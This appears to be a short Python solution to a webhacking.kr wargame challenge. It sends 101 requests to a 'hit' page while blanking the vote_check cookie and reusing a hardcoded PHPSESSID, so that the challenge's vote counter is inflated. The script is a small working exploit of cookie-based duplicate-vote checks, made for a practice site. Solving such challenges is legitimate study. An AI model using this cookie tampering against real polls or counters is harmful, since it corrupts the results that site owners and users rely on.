import urllib.request

for i in range(0, 101):
    url = "http://webhacking.kr/challenge/codeing/code5.html?hit=whois"
    header = {"Cookie":"vote_check=; PHPSESSID=c3cf55ad600f2495e211a471b53a376d"}
    request = urllib.request.Request(url,None,header)
    response = urllib.request.urlopen(request).read()

print(response)
